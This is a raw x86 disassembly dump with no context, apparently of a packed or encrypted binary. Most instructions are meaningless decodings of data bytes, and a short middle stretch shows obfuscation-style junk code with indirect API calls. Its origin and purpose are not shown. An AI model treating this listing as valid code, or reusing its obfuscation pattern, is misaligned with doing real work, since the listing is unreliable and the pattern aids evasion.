  402234:	or     edi,eax
  402236:	dec    ebx
  402237:	pop    edi
  402238:	(bad)
  40223c:	jmp    0xcf6f:0x22b97537
  402243:	inc    eax
  402244:	adc    DWORD PTR [edx-0x6ffd30c5],ebp
  40224a:	inc    edx
  40224b:	fistp  WORD PTR [eax-0x29aa9e99]
  402251:	loope  0x402272
  402253:	outs   dx,BYTE PTR ds:[esi]
  402254:	and    ebp,DWORD PTR [esi-0x1b]
  402257:	repz aas 
  402259:	mov    ?,WORD PTR [eax+0x4dfdfb38]
  40225f:	pop    eax
  402260:	ins    DWORD PTR es:[edi],dx
  402261:	lods   al,BYTE PTR ds:[esi]
  402262:	aam    0x90
  402264:	cmp    esi,DWORD PTR [ebx+0x574e6594]
  40226a:	pop    ss
  40226b:	into   
  40226c:	loop   0x40221c
  40226e:	pop    ds
  40226f:	loopne 0x402259
  402271:	aas    
  402272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402273:	inc    esi
  402274:	mov    edx,0x2cd903f
  402279:	lahf   
  40227a:	call   0x29bd913d
  40227f:	lods   eax,DWORD PTR ds:[esi]
  402280:	jb     0x4022ba
  402282:	(bad)  
  402283:	push   edx
  402284:	jae    0x4022ab
  402286:	mov    ss,WORD PTR [edx]
  402288:	fwait
  402289:	or     cl,BYTE PTR [eax+edx*4-0x14]
  40228d:	or     edi,DWORD PTR [ebx+0x39]
  402290:	ret    
  402291:	add    si,WORD PTR [edx+0x7bbbfdda]
  402298:	mov    ds:0xc5b1032e,eax
  40229d:	daa    
  40229e:	jns    0x40230f
  4022a0:	imul   ebx,DWORD PTR [edx],0xeb952520
  4022a6:	pusha  
  4022a7:	adc    eax,0xce37c9a5
  4022ac:	hlt    
  4022ad:	mov    eax,ds:0xf0cb8812
  4022b2:	rcr    BYTE PTR [esi+0x1a],1
  4022b5:	int    0x8c
  4022b7:	sar    DWORD PTR [esi],1
  4022b9:	loopne 0x4022a2
  4022bb:	xchg   BYTE PTR [ebx+0x3a2bbd6d],bl
  4022c1:	inc    di
  4022c3:	bsf    eax,DWORD PTR [edx-0xbd8d457]
  4022ca:	fwait
  4022cb:	jnp    0x402321
  4022cd:	aaa    
  4022ce:	fwait
  4022cf:	sbb    eax,0x5bf9cfa8
  4022d4:	gs pop ebx
  4022d6:	pop    ecx
  4022d7:	addr16 pop esi
  4022d9:	push   eax
  4022da:	(bad)  
  4022dc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	and    ebp,DWORD PTR [eax+0x52]
  4022e1:	es push ebx
  4022e3:	es data16 mov bp,si
  4022e8:	and    dl,BYTE PTR [edi]
  4022ea:	xchg   BYTE PTR [edi+0x25],cl
  4022ed:	xchg   esp,eax
  4022ee:	push   esi
  4022ef:	add    ah,0x55
  4022f2:	iret   
  4022f3:	dec    edi
  4022f4:	int    0xa3
  4022f6:	mov    DWORD PTR [edx+0x67],edi
  4022f9:	loop   0x40230b
  4022fb:	mov    dl,0xab
  4022fd:	jns    0x40234a
  4022ff:	jo     0x40233e
  402301:	xchg   edx,eax
  402302:	pop    ebx
  402303:	iret   
  402304:	xor    eax,DWORD PTR [eax]
  402306:	clc    
  402307:	fistp  DWORD PTR [edx-0x76c52698]
  40230d:	ror    BYTE PTR [eax+0x17375146],1
  402313:	push   ds
  402314:	and    cl,bh
  402316:	(bad)  
  402317:	mov    cl,0xd3
  402319:	js     0x4022a4
  40231b:	aad    0x90
  40231d:	mov    bl,0xba
  40231f:	jge    0x4022bb
  402321:	xchg   DWORD PTR [edi+0x2],ecx
  402324:	aam    0x14
  402326:	mov    BYTE PTR ds:0xf511ea5e,dl
  40232c:	aam    0x9a
  40232e:	test   DWORD PTR [eax-0x69],esi
  402331:	popa   
  402332:	push   ebx
  402333:	sbb    DWORD PTR [ebx],esp
  402335:	rol    BYTE PTR [ebp-0x43],0x3
  402339:	test   BYTE PTR ds:0x81634c75,0xc5
  402340:	pop    eax
  402341:	sub    dl,cl
  402343:	shl    DWORD PTR [edx],0x66
  402346:	sub    ebp,DWORD PTR [ebp+0x19]
  402349:	mov    ebx,0xfc9dff7d
  40234e:	and    esi,DWORD PTR [edi]
  402350:	or     DWORD PTR [ecx],ebp
  402352:	in     eax,0x43
  402354:	inc    ebx
  402355:	jno    0x4022f6
  402357:	pop    esp
  402358:	shr    DWORD PTR [eax],1
  40235a:	pop    ebx
  40235b:	inc    eax
  40235c:	pop    es
  40235d:	test   BYTE PTR [ebp+0x3e],al
  402360:	in     al,0x35
  402362:	dec    esp
  402363:	ret    
  402364:	pushf  
  402365:	imul   esi,DWORD PTR [eax],0x161248ca
  40236b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236c:	mov    esp,0xe27d53c4
  402371:	loopne 0x4023c7
  402373:	out    0xa2,eax
  402375:	add    DWORD PTR [ecx-0x1774e330],ebx
  40237b:	in     al,dx
  40237c:	jb     0x4023fb
  40237e:	and    BYTE PTR [edi+0x4a9b6f64],dl
  402384:	mov    esi,0xdd05fe8c
  402389:	jns    0x4023f6
  40238b:	dec    edx
  40238c:	xor    ecx,ebx
  40238e:	add    BYTE PTR [eax+0x16d9bf11],ch
  402394:	or     eax,0x47965602
  402399:	in     al,0x3b
  40239b:	(bad)  
  40239c:	ss push edi
  40239e:	loop   0x4023f8
  4023a0:	out    dx,eax
  4023a1:	cdq    
  4023a2:	cli    
  4023a3:	ror    DWORD PTR [ebx],0x2
  4023a6:	mov    bh,0x42
  4023a8:	push   es
  4023a9:	(bad)  
  4023aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ab:	jp     0x4023a9
  4023ad:	ja     0x402379
  4023af:	stc    
  4023b0:	call   0x54c11d96
  4023b5:	imul   esi,DWORD PTR [ebp-0x76],0x33856663
  4023bc:	outs   dx,DWORD PTR ds:[esi]
  4023bd:	cmp    al,0xd2
  4023bf:	sub    dh,BYTE PTR [eax+0x3bf4d4e7]
  4023c5:	ins    BYTE PTR es:[edi],dx
  4023c6:	addr16 sbb eax,0xf25840e7
  4023cc:	jp     0x40243f
  4023ce:	jecxz  0x402417
  4023d0:	cmp    dh,BYTE PTR [ebx-0x61]
  4023d3:	cmp    eax,0xcee820d
  4023d8:	data16 daa 
  4023da:	idiv   BYTE PTR [ebp+0x2f]
  4023dd:	into   
  4023de:	mov    edx,0xfb4409b8
  4023e3:	xlat   BYTE PTR ds:[ebx]
  4023e4:	dec    edi
  4023e5:	xchg   edi,eax
  4023e6:	or     eax,0xd11834c9
  4023eb:	in     eax,0x51
  4023ed:	xor    BYTE PTR [eax+esi*8-0x34691cd2],al
  4023f4:	ret    
  4023f5:	shl    BYTE PTR [edi+0x68],0x28
  4023f9:	ficom  WORD PTR [edx+0x56]
  4023fc:	mov    edx,0xb8e4ab89
  402401:	imul   eax,DWORD PTR [esi-0x3342e0e8],0x3a
  402408:	in     al,0x78
  40240a:	sub    BYTE PTR [esp+edi*4-0x74a90adb],bh
  402411:	outs   dx,BYTE PTR ds:[esi]
  402412:	xchg   esi,eax
  402413:	int    0xc1
  402415:	loop   0x402483
  402417:	adc    bl,BYTE PTR [eax-0x4b587d88]
  40241d:	push   0x15dbaf58
  402422:	neg    ch
  402424:	xor    cl,BYTE PTR [esp+ecx*8]
  402427:	shl    esi,0x54
  40242a:	adc    eax,0x62f664da
  40242f:	cmc    
  402430:	jnp    0x402403
  402432:	mov    BYTE PTR ds:0x6b609d31,bh
  402438:	mov    WORD PTR [ebp+0x6ebf1dbb],?
  40243e:	pop    edi
  40243f:	data16 mov al,0x70
  402442:	stos   BYTE PTR es:[edi],al
  402443:	adc    dh,ch
  402445:	dec    esi
  402446:	mov    bh,0xec
  402448:	aad    0xd1
  40244a:	leave  
  40244b:	or     DWORD PTR [eax+0x1670c0d9],eax
  402451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402452:	aam    0x28
  402454:	mov    eax,0x3197034
  402459:	adc    bl,BYTE PTR [eax+0x54]
  40245c:	sub    DWORD PTR [ebx+0x15],esp
  40245f:	(bad)  
  402460:	xor    eax,ebx
  402462:	adc    eax,DWORD PTR [ebx]
  402464:	jo     0x4024b9
  402466:	push   cs
  402467:	mov    edi,0x4c5cdc9d
  40246c:	add    DWORD PTR [esp+eax*2+0x283d6388],0xffffffb1
  402474:	sbb    DWORD PTR [esp+ebp*4],0x41
  402478:	and    ch,BYTE PTR [edx-0x6e]
  40247b:	sub    BYTE PTR [eax+0x13f6d437],bl
  402481:	leave  
  402482:	jb     0x4024d8
  402484:	aam    0xed
  402486:	sbb    eax,0x5e67208
  40248b:	mov    ebp,0xfd725174
  402490:	les    ebp,FWORD PTR [edi]
  402492:	mov    ah,0x19
  402494:	enter  0xa0c8,0x34
  402498:	dec    ecx
  402499:	lea    edx,[esi-0x6f]
  40249c:	dec    esp
  40249d:	inc    BYTE PTR [ebx-0x1b]
  4024a0:	sbb    BYTE PTR [ebx+0x1b],ch
  4024a3:	mov    ds:0xc14d8a2d,eax
  4024a8:	jmp    0x267d0cc8
  4024ad:	enter  0xeae5,0xa4
  4024b1:	jns    0x402452
  4024b3:	arpl   bp,dx
  4024b5:	fs int 0xc9
  4024b8:	and    eax,DWORD PTR [edi]
  4024ba:	xor    BYTE PTR [eax],al
  4024bc:	loopne 0x40246f
  4024be:	xor    ebp,DWORD PTR [eax+0x388ce1ea]
  4024c4:	loopne 0x402513
  4024c6:	inc    eax
  4024c7:	mov    ds:0xce226536,eax
  4024cc:	mov    bh,0x99
  4024ce:	imul   ebx,DWORD PTR [edi+edx*2+0x3c47f935],0xffffffdf
  4024d6:	jmp    0xe176b06f
  4024db:	test   al,0xdc
  4024dd:	out    0x9,eax
  4024df:	test   al,0xd3
  4024e1:	les    edi,FWORD PTR [eax+0x6c]
  4024e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e5:	mov    eax,ds:0x2ba4848c
  4024ea:	dec    eax
  4024eb:	sbb    BYTE PTR [ecx-0x6e],al
  4024ee:	inc    ebx
  4024ef:	lds    edi,FWORD PTR [edx-0x7a]
  4024f2:	retf   
  4024f3:	xor    eax,0xb2b3cad7
  4024f8:	mov    eax,ds:0x4a916385
  4024fd:	jmp    0x3161:0x389e33ae
  402504:	push   es
  402505:	push   ebx
  402506:	jo     0x402573
  402508:	je     0x40248b
  40250a:	stos   BYTE PTR es:[edi],al
  40250b:	pop    edx
  40250c:	xchg   esp,eax
  40250d:	bound  eax,QWORD PTR [ecx]
  40250f:	push   edi
  402510:	jmp    0x7575:0x3bd68cb4
  402517:	jb     0x402504
  402519:	mov    eax,?
  40251b:	int    0x72
  40251d:	mov    eax,0x5b0453bb
  402522:	les    eax,FWORD PTR [edx]
  402524:	sahf   
  402525:	or     ah,BYTE PTR [esi-0x48cc1a36]
  40252b:	xchg   ecx,eax
  40252c:	shl    BYTE PTR [ebp-0x3c],cl
  40252f:	stc    
  402530:	cmc    
  402531:	push   ecx
  402532:	mov    ebx,DWORD PTR [edi-0x1d]
  402535:	fbstp  TBYTE PTR [ebx+0x6b4d6904]
  40253b:	cwde   
  40253c:	fisttp WORD PTR [ebp-0x4a]
  40253f:	adc    BYTE PTR [di],dl
  402542:	fbstp  TBYTE PTR [edx+ecx*8]
  402545:	or     ebx,edx
  402547:	add    eax,DWORD PTR [esi-0x58]
  40254a:	in     al,dx
  40254b:	push   0xffffffda
  40254d:	pop    esp
  40254e:	cmp    al,0xa4
  402550:	repz pop esi
  402552:	fistp  DWORD PTR [eax+0x36]
  402555:	test   BYTE PTR [edx+0xafee8d6],bh
  40255b:	xor    eax,DWORD PTR [ebx-0x29de868d]
  402561:	outs   dx,BYTE PTR ds:[esi]
  402562:	(bad)  
  402563:	sub    DWORD PTR [esi-0x4f0c5f2],ecx
  402569:	cwde   
  40256a:	pop    eax
  40256b:	rcl    ah,0x18
  40256e:	mov    dh,0x36
  402570:	jp     0x402565
  402572:	into   
  402573:	mov    ds:0xdcdaf667,eax
  402578:	rcl    BYTE PTR [ebp-0x5a7fde48],cl
  40257e:	daa    
  40257f:	xchg   ebx,eax
  402580:	xchg   ebp,eax
  402581:	adc    DWORD PTR [edx+0x482d715e],esi
  402587:	and    eax,0x697a5368
  40258c:	pop    esi
  40258d:	loop   0x402607
  40258f:	out    dx,eax
  402590:	lock ins DWORD PTR es:[edi],dx
  402592:	push   edx
  402593:	dec    ecx
  402594:	push   ss
  402595:	mov    ebx,0x26467cb0
  40259a:	ret    0xf977
  40259d:	inc    edx
  40259e:	add    BYTE PTR [edx],al
  4025a0:	jbe    0x40253d
  4025a2:	pop    ebp
  4025a3:	ret    
  4025a4:	lds    edi,FWORD PTR [edi]
  4025a6:	and    DWORD PTR [edi+0x6cd1d6eb],ebx
  4025ac:	ja     0x4025d0
  4025ae:	lods   al,BYTE PTR ds:[esi]
  4025af:	mov    dl,0x1a
  4025b1:	and    ebp,DWORD PTR [edi]
  4025b3:	(bad)  
  4025b4:	mov    ebp,0x5f5dfdcc
  4025b9:	pop    ds
  4025ba:	int    0x52
  4025bc:	aas    
  4025bd:	jecxz  0x4025c7
  4025bf:	adc    eax,0x2b6e8242
  4025c4:	mov    al,0xcd
  4025c6:	in     al,dx
  4025c7:	sbb    edi,edx
  4025c9:	fidivr DWORD PTR [ebx-0x38010474]
  4025cf:	inc    ebp
  4025d0:	nop
  4025d1:	jb     0x40260e
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	movzx  eax,WORD PTR ds:0x4282ff
  4025dc:	adc    DWORD PTR ds:0x42818b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428173,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428167,0x0
  4025fd:	mov    DWORD PTR ds:0x428313,0x76b5
  402607:	mov    DWORD PTR ds:0x42816f,edx
  40260d:	mov    DWORD PTR ds:0x428287,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428273
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428167,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42823f
  402645:	call   DWORD PTR ds:0x428d9c
  40264b:	sbb    DWORD PTR ds:0x42838b,0x36f
  402655:	adc    DWORD PTR ds:0x42830f,0x428197
  40265f:	sub    DWORD PTR ds:0x42837f,0x42831b
  402669:	and    DWORD PTR ds:0x42815f,0x42824b
  402673:	add    DWORD PTR ds:0x42831f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428167
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42815b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42828f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282ef,edx
  4026bd:	mov    DWORD PTR ds:0x42824b,ecx
  4026c3:	mov    DWORD PTR ds:0x428173,edx
  4026c9:	mov    DWORD PTR ds:0x42826f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42815b
  4026dd:	mov    DWORD PTR ds:0x42828f,edx
  4026e3:	cmp    DWORD PTR ds:0x42828f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428da0
  402708:	add    DWORD PTR ds:0x428297,0x4282f7
  402712:	sub    DWORD PTR ds:0x428313,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42816b,0x16a6
  402726:	dec    DWORD PTR ds:0x428187
  40272c:	and    DWORD PTR ds:0x42826b,edx
  402732:	or     DWORD PTR ds:0x4282fb,edx
  402738:	mov    eax,ds:0x42818f
  40273d:	and    DWORD PTR ds:0x4283a3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283a3
  402751:	sbb    DWORD PTR ds:0x42826f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42824f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428303
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x43b67baa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    bh,dh
  4027aa:	arpl   ax,cx
  4027ac:	mov    BYTE PTR es:[esi-0x507fbe38],0xd8
  4027b4:	int3   
  4027b5:	and    DWORD PTR [edi+0x7209ea1e],edx
  4027bb:	jecxz  0x40283a
  4027bd:	test   BYTE PTR [edx],0xd3
  4027c0:	adc    DWORD PTR [ecx],edx
  4027c2:	in     eax,0x76
  4027c4:	xor    BYTE PTR [ebx],ch
  4027c6:	and    bh,dl
  4027c8:	cdq    
  4027c9:	dec    esi
  4027ca:	cmp    edx,DWORD PTR ds:0x3bca6baa
  4027d0:	sti    
  4027d1:	rcr    edx,cl
  4027d3:	sbb    BYTE PTR [ebx-0x61],0x51
  4027d7:	xor    eax,0xd0068a19
  4027dc:	test   BYTE PTR [edi+0x5a],ah
  4027df:	imul   ebp,DWORD PTR [esi-0x22],0xf5624dd
  4027e6:	mov    eax,ds:0x786c712d
  4027eb:	add    eax,0xe2a51da9
  4027f0:	mov    ds:0x4a0531f5,al
  4027f5:	mov    ds:0xdbd21849,eax
  4027fa:	lahf   
  4027fb:	nop
  4027fc:	sbb    al,0x7d
  4027fe:	cmc    
  4027ff:	add    bh,BYTE PTR [edx]
  402801:	xchg   esp,eax
  402802:	sahf   
  402803:	dec    eax
  402804:	fld    DWORD PTR [edi-0x47]
  402807:	dec    ebx
  402808:	(bad)  
  402809:	sbb    BYTE PTR [ebp-0x17],ah
  40280c:	scas   al,BYTE PTR es:[edi]
  40280d:	mov    eax,0xba93cd81
  402812:	out    dx,eax
  402813:	mov    eax,0x86a34d0b
  402818:	stos   DWORD PTR es:[edi],eax
  402819:	cli    
  40281a:	jecxz  0x4027af
  40281c:	hlt    
  40281d:	inc    ebx
  40281e:	ficom  DWORD PTR [eax]
  402820:	and    BYTE PTR [eax],dl
  402822:	out    dx,al
  402823:	fsub   QWORD PTR [ecx+0x73]
  402826:	mov    ecx,0x99ed36b2
  40282b:	add    esi,DWORD PTR [ecx-0x6a]
  40282e:	dec    ecx
  40282f:	rcr    edx,0xea
  402832:	popa   
  402833:	cli    
  402834:	and    edi,ecx
  402836:	push   ss
  402837:	dec    ebx
  402838:	jmp    0x7864:0xdf8c1f3c
  40283f:	pop    es
  402840:	rol    DWORD PTR [edx+0x6855179],1
  402846:	add    esi,DWORD PTR [eax+0x2abda2f3]
  40284c:	sub    al,0x1a
  40284e:	xor    ah,BYTE PTR [eax+0x7b65272c]
  402854:	xor    BYTE PTR [ebp-0x54],0xea
  402858:	mov    eax,0x2c6fe7e2
  40285d:	gs ret 0x43ce
  402861:	mov    ecx,0x80d226db
  402866:	scas   al,BYTE PTR es:[edi]
  402867:	sahf   
  402868:	xchg   ebx,eax
  402869:	loopne 0x4028c4
  40286b:	cmp    dh,BYTE PTR [esi+0x44]
  40286e:	imul   ebp,DWORD PTR [ebp-0x4e0b53f1],0x13
  402875:	xchg   DWORD PTR [edx],esp
  402877:	das    
  402878:	xchg   BYTE PTR [ebx+0x4c],dh
  40287b:	mov    dh,0x6d
  40287d:	call   0x55f9:0x553061d3
  402884:	icebp  
  402885:	sub    al,0x5a
  402887:	sbb    BYTE PTR [ebp+0x50],ah
  40288a:	outs   dx,BYTE PTR ds:[esi]
  40288b:	out    0x15,al
  40288d:	jae    0x4028d8
  40288f:	in     al,0xfe
  402891:	sub    bl,BYTE PTR [ecx+0x22258554]
  402897:	lfs    ebp,FWORD PTR [eax-0x77]
  40289b:	jmp    0x40287d
  40289d:	(bad)  
  40289e:	(bad)  
  40289f:	sti    
  4028a0:	pop    ecx
  4028a1:	xchg   esi,eax
  4028a2:	repz mov bh,0x5b
  4028a5:	in     al,0xd8
  4028a7:	add    DWORD PTR [edi],edi
  4028a9:	lahf   
  4028aa:	inc    ecx
  4028ab:	xchg   esp,eax
  4028ac:	test   al,0xc6
  4028ae:	je     0x4028c9
  4028b0:	int3   
  4028b1:	dec    edi
  4028b2:	sub    DWORD PTR [eax+0x62ad0d3a],0x1e687e06
  4028bc:	aam    0x84
  4028be:	or     bl,cl
  4028c0:	xchg   esi,eax
  4028c1:	jne    0x4028af
  4028c3:	and    eax,0xfb7e3ad8
  4028c8:	jns    0x4028fc
  4028ca:	leave  
  4028cb:	push   esp
  4028cc:	inc    edi
  4028cd:	gs inc esp
  4028cf:	mov    al,0xfc
  4028d1:	mov    ecx,0x48157248
  4028d6:	(bad)  
  4028d8:	xchg   esp,eax
  4028d9:	pop    es
  4028da:	cmp    ah,BYTE PTR [eax-0x78]
  4028dd:	sub    al,0xab
  4028df:	jecxz  0x40291b
  4028e1:	imul   esp,DWORD PTR [ebx-0x6a],0xffffffc7
  4028e5:	ja     0x4028bc
  4028e7:	loope  0x40295a
  4028e9:	fistp  DWORD PTR [ebp+0x44e2db6a]
  4028ef:	loopne 0x4028b2
  4028f1:	sbb    edx,ebp
  4028f3:	sub    ecx,ebx
  4028f5:	(bad)  [ecx]
  4028f7:	imul   edx,DWORD PTR [ecx-0x53e3d59],0x5e
  4028fe:	call   0xfb2abeef
  402903:	frstor [ecx]
  402905:	ret    0x63c4
  402908:	adc    al,0xf9
  40290a:	inc    ebp
  40290b:	(bad)  
  40290c:	fcmovbe st,st(6)
  40290e:	xchg   ecx,eax
  40290f:	ins    BYTE PTR es:[edi],dx
  402910:	sub    DWORD PTR [esi-0x1ec00f56],0x7a
  402917:	cs sub esi,eax
  40291a:	mov    ch,0xed
  40291c:	push   eax
  40291d:	xor    BYTE PTR [edi+0x19],0x2e
  402921:	pop    ecx
  402922:	or     ecx,DWORD PTR [edx]
  402924:	add    cl,BYTE PTR [eax-0x39]
  402927:	scas   al,BYTE PTR es:[edi]
  402928:	ins    DWORD PTR es:[edi],dx
  402929:	sbb    BYTE PTR [ebp+0xc],0x0
  40292d:	mov    bh,0xc2
  40292f:	adc    BYTE PTR [ebp-0x17c2b8af],dh
  402935:	clc    
  402936:	addr16 out 0x97,eax
  402939:	adc    bl,dl
  40293b:	cmc    
  40293c:	ror    DWORD PTR [edi],0x38
  40293f:	mov    edx,0xa18d51d8
  402944:	or     ebp,ebx
  402946:	mov    bh,0x8f
  402948:	addr16 dec ebp
  40294a:	dec    ebx
  40294b:	fistp  QWORD PTR [ebx]
  40294d:	xchg   edx,eax
  40294e:	mov    eax,ds:0xd2e5f5c6
  402953:	add    DWORD PTR [ebx+0x3611cf2],esp
  402959:	pop    ds
  40295a:	dec    esi
  40295b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40295c:	jge    0x4029d8
  40295e:	and    al,0x28
  402960:	sbb    DWORD PTR [eax+0x60],esi
  402963:	ins    DWORD PTR es:[edi],dx
  402964:	cmovl  ecx,esi
  402967:	(bad)  
  402968:	xchg   ebp,eax
  402969:	ret    0x450d
  40296c:	pop    ebp
  40296d:	pop    esp
  40296e:	and    esi,DWORD PTR [esi+0x562b055a]
  402974:	cmp    al,0x45
  402976:	cwde   
  402977:	sub    edx,0x9df8b0cf
  40297d:	es cdq 
  40297f:	adc    ch,dh
  402981:	sub    ebp,esi
  402983:	jb     0x4029d7
  402985:	add    BYTE PTR ss:[esi-0x199dedba],bl
  40298c:	lds    ecx,FWORD PTR [ecx-0x61]
  40298f:	mov    edx,0x2e4a2e21
  402994:	loopne 0x40293a
  402996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402997:	lahf   
  402998:	xchg   ebx,eax
  402999:	in     al,dx
  40299a:	sub    eax,0xdb324c78
  40299f:	inc    edi
  4029a1:	fstp   TBYTE PTR [ecx-0x2431bc25]
  4029a7:	sbb    al,0x4b
  4029a9:	push   cs
  4029aa:	mov    dh,0xfc
  4029ac:	cdq    
  4029ad:	cmp    al,0xf2
  4029af:	mov    edx,0x98248ba2
  4029b4:	call   0x7e91:0xa38b865
  4029bb:	repz cmp al,0xb4
  4029be:	and    edi,eax
  4029c0:	sub    eax,0xdc1e6a67
  4029c5:	xchg   BYTE PTR [ebp+ecx*1-0x4f02a833],cl
  4029cc:	(bad)  
  4029cd:	mov    ch,0xe2
  4029cf:	jg     0x402a10
  4029d1:	xchg   ebx,eax
  4029d2:	push   ebp
  4029d3:	cld    
  4029d4:	rcl    DWORD PTR [ecx],1
  4029d6:	aad    0x6a
  4029d8:	shl    al,1
  4029da:	cli    
  4029db:	inc    edi
  4029dc:	push   ecx
  4029dd:	call   0x11b5ca10
  4029e2:	add    ebp,DWORD PTR ds:0x33a6ff55
  4029e8:	hlt    
  4029e9:	iret   
  4029ea:	aad    0x58
  4029ec:	xor    bh,BYTE PTR [eax+0x12505944]
  4029f2:	mov    ds:0x2b1b1366,al
  4029f7:	arpl   WORD PTR [edi+0x10ce9aeb],dx
  4029fd:	mov    bl,0xdc
  4029ff:	mov    bh,0xdb
  402a01:	mov    ah,0x78
  402a03:	jge    0x402a27
  402a05:	popa   
  402a06:	push   es
  402a07:	xchg   ebp,eax
  402a08:	nop
  402a09:	popa   
  402a0a:	mov    dl,0xa5
  402a0c:	mov    cl,0x34
  402a0e:	fsub   DWORD PTR [ebx+0x6d62660]
  402a14:	mov    fs,esp
  402a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a17:	fdivr  st,st(1)
  402a19:	test   BYTE PTR [edi-0x16],bl
  402a1c:	mov    dl,0x98
  402a1e:	jns    0x402a0a
  402a20:	gs call 0x7ed697d7
  402a26:	outs   dx,DWORD PTR ds:[esi]
  402a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a28:	jbe    0x402a37
  402a2a:	or     eax,DWORD PTR [ebp+0x581b6ab9]
  402a30:	iret   
  402a31:	jp     0x402a51
  402a33:	not    DWORD PTR [ebp+0x2d2498ce]
  402a39:	jmp    0x7f2174
  402a3e:	std    
  402a3f:	std    
  402a40:	or     DWORD PTR [edx-0x57],ecx
  402a43:	jnp    0x4029db
  402a45:	jl     0x402abc
  402a47:	dec    ebx
  402a48:	mov    ds:0x4fbe9242,al
  402a4d:	mov    ebp,0x929b1c33
  402a52:	sub    esp,DWORD PTR [edi]
  402a54:	call   0x15cd3db3
  402a59:	jmp    0x402a5d
  402a5b:	adc    DWORD PTR [edi-0x60],ecx
  402a5e:	aas    
  402a5f:	push   eax
  402a60:	sbb    DWORD PTR [eax-0x36],0xffffffc6
  402a64:	call   0x9d1d0779
  402a69:	dec    edi
  402a6a:	lods   al,BYTE PTR ds:[esi]
  402a6b:	add    BYTE PTR [ebx],bh
  402a6d:	ds pusha 
  402a6f:	sti    
  402a70:	fsub   QWORD PTR [edx+0x638159da]
  402a76:	ja     0x402a0e
  402a78:	adc    BYTE PTR [edi+esi*1-0x2bc0f8f5],dh
  402a7f:	adc    eax,0x81f77ed8
  402a84:	retf   0xf377
  402a87:	(bad)  
  402a88:	mov    al,0x63
  402a8a:	sub    cl,BYTE PTR [ebx]
  402a8c:	in     al,0x34
  402a8e:	(bad)  
  402a8f:	fild   DWORD PTR [edx-0x7e]
  402a92:	xchg   BYTE PTR [eax+0x41e0b8c4],ch
  402a98:	sub    edx,ebp
  402a9a:	dec    ecx
  402a9b:	cmp    ah,cl
  402a9d:	test   al,0xf5
  402a9f:	sbb    DWORD PTR [eax-0x75],ecx
  402aa2:	icebp  
  402aa3:	mov    ebp,0xe6a6ef8e
  402aa8:	xchg   ebx,eax
  402aa9:	fdiv   st,st(5)
  402aab:	ds test edx,ecx
  402aae:	out    dx,al
  402aaf:	stc    
  402ab0:	outs   dx,DWORD PTR ds:[esi]
  402ab1:	stc    
  402ab2:	mov    esi,0xa341ce08
  402ab7:	stc    
  402ab8:	fbstp  TBYTE PTR fs:[ecx-0x65c8d1b1]
  402abf:	cdq    
  402ac0:	push   esp
  402ac1:	push   ss
  402ac2:	xlat   BYTE PTR ds:[ebx]
  402ac3:	mov    DWORD PTR [eax+0x26],ebx
  402ac6:	retf   
  402ac7:	sub    BYTE PTR [esi+edi*1+0x4a],bl
  402acb:	mov    ah,0xf7
  402acd:	outs   dx,DWORD PTR ds:[esi]
  402ace:	in     al,0x4
  402ad0:	out    dx,eax
  402ad1:	mov    ecx,0x97367383
  402ad6:	jo     0x402a5b
  402ad8:	push   ds
  402ad9:	cmp    BYTE PTR [edi-0x26b3b5fa],al
  402adf:	scas   eax,DWORD PTR es:[edi]
  402ae0:	sbb    BYTE PTR [edi+0x8],dl
  402ae3:	xor    bl,BYTE PTR [eax]
  402ae5:	jg     0x402abd
  402ae7:	lahf   
  402ae8:	aam    0x7c
  402aea:	cmp    eax,0x6cf787e1
  402aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
